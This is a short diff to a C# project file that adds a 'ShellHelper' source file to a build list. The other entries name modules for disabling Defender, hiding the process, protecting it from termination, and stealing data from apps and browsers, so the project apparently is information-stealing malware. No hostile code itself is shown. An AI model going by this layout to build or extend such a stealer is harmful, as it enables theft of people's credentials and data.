@@ -60,6 +60,7 @@
     <Compile Include="Protect\DisableDefender.cs" />
     <Compile Include="Protect\HideModule.cs" />
     <Compile Include="Protect\ProcessProtect.cs" />
+    <Compile Include="Protect\ShellHelper.cs" />
     <Compile Include="Steal\Apps.cs" />
     <Compile Include="Steal\Browsers.cs" />
   </ItemGroup>
